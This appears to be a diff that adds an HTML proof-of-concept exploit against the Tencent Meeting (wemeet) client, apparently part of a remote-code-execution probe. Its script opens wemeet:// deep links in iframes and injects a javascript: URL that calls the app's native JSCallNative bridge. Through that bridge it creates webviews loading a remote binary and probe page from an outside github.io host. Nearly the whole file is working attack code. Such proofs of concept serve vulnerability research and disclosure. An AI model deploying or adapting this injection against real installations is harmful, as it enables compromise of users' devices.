@@ -1,0 +1,18 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P31</h1>
+<script>
+document.title='P31L-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var js="javascript:(function(){document.title='P31INJ:'+location.host;window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P31CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,42)};function c(m,e,p){window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:m+'.'+e}))}c('CommonPlugin','CreateWebview',{url:'https://gitwhs.github.io/wm-poc-rce/p25.bin'});setTimeout(function(){c('CommonPlugin','OpenNewPage',{url:'https://gitwhs.github.io/wm-poc-rce/probe30.html'})},400);setTimeout(function(){c('CommonPlugin','CreateWebview',{url:'https://meeting.tencent.com/v2/webview/keep-app-alive'})},800);setTimeout(function(){c('CommonPlugin','CheckJsApiConfig',{})},1200)})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P31L-OFFICIAL'); }, 600);
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(js),'P31L-JSINJ'); }, 12000);
+setTimeout(function(){ document.title='P31L-DONE'; }, 24000);
+</script>
+</body></html>
